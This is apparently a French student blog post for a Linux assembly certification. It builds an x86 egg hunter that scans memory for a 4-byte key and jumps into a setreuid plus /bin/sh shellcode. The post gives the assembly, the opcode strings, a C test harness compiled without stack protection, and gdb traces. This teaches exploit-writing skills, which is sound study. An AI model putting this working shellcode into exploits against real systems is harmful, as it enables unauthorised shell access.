# Assignement 3 #

Il s'agit dans ce troisième exercice de coder un "Egg Hunter shellcode". Il s'agit d'un technique permettant de palier au manque de mémoire necessaire à l'ajout du shellcode en mémoire. Le programme va chercher en mémoire une séquence lui indiquant qu'il se trouve au début du shellcode. Cette séquence doit être une suite d'opcodes qui ont peu de chance d'être contigues afin de pouvoir le retrouver facilement. Etant sur une architecture 32 bits nous allons utiliser une clé (Egg Key) de 4 octets.

Afin d'améliorer les chances de le trouver, il peut être conseillé de multiplier sa taille par deux.

## Définition de la clé ##

Nous allons pour cela utiliser la clé "b33fb33f".

Le egg hunter va parcourir la mémoire à la recherche de la clé précédement définie. Lors qu'il va essayer d'accéder à une zone mémoire non mappée cela va causer une erreur syst§me (SIGSEV). Il est donc necessaire de connaître une adresse accessible dans le même segment pour le shellcode et la clé.

```c
[egg hunter][random memory][egg][egg][shellcode]
````

Nous allons pour cela créer un EggHunter qui aura pour fonction de chercher dans la mémoire la clé. Il faut pour cela s'assurer d'être dans le bon segment.

```c
; Egg Hunter Linux x86 shellcode
; Author: Alain Menelet
; Tested on ubuntu 16.04.3 LTS
; Egg Hunter stack memory


global _start

section .text

_start:
	jmp short valid

validAddress:
	
	pop eax			    ; eax contains a valid address
	mov ebx, 0x3fb33fb3	    ; egg key

_:
	inc eax			    ; increase memory
	cmp dword [eax], ebx        ; compare with the key
	jne _                       ; loop if dfferent
	jmp eax                     ; if equal jump to shellcode



valid:
	call validAddress

```

Nous compilons le tout :

```c
"\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";
```

Une fois cela fait nous allons modifier le programme C afin qu'il prenne en compte le shellcode, l'Egg key et l'Egg hunter.

Nous prenons le shellcode utilisé dans l'exercice 6. Il exécute un setreuid + /bin/sh.

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char egg[] = \
"\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";

unsigned char shellcode[] = \
"\xb3\x3f\xb3\x3f"
"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Taille de l'Egg Hhunter %d\nAdresse du Shellcode:%p\n", strlen(egg), shellcode);
	int (*ret)() = (int(*)())egg;
	ret();

return 0;
}

La compilation se fait de la même manière :

gcc -fno-stack-protector -z execstack test_egg.c -o test_egg
```

Nous testons le tout :

```c
phidia@xophidia-VirtualBox:~/Documents/Shellcode/as3$ ./test_egg 
Taille de l'Egg Hhunter 20
Adresse du Shellcode:0x804a060
$ 
```

### Détails : ###

L'egg Hunter fonctionne comme suit :
Nous voyons l'adresse obtenue lors du pop eax. Elle est valide et servira de point de départ à la recherche.

Une fois la clé trouvée, nous effectuons un saut à cette adresse soit le début du shellcode.

```c
EAX: 0x8048074 --> 0x0           ; adress valid from jum pop call technique
EBX: 0x3fb33fb3                  ; Egg key
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xbffff200 --> 0x1 
EIP: 0x8048068 (<_>:	inc    eax) ; loop while the key is not found

[-------------------------------------code-------------------------------------]
   0x804805f:	add    bl,ch
   0x8048061 <_start+1>:	or     eax,0x3fb3bb58
   0x8048066 <validAddress+4>:	mov    bl,0x3f
=> 0x8048068 <_>:	inc    eax
   0x8048069 <_+1>:	cmp    DWORD PTR [eax],ebx
   0x804806b <_+3>:	jne    0x8048068 <_>
   0x804806d <_+5>:	jmp    eax
   0x804806f <valid>:	call   0x8048062 <validAddress>


Nous observons dans la pile la clé dans egg et au début du shellcode.

gdb-peda$ x/20x 0x804a040
0x804a040 <egg>:	0xbb580deb	0x3fb33fb3	0x75183940	0xe8e0fffb
0x804a050 <egg+16>:	0xffffffee	0x00000000	0x00000000	0x00000000
0x804a060 <shellcode>:	0x3fb33fb3	0xe1f7c931	0xb099cb89	0xf780cda4
0x804a070 <shellcode+16>:	0x2f6851e1	0x6868732f	0x6e69622f	0x8951e389
0x804a080 <shellcode+32>:	0xe18953e2	0x80cd0bb0	0x00000000	0x00000000
```


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: 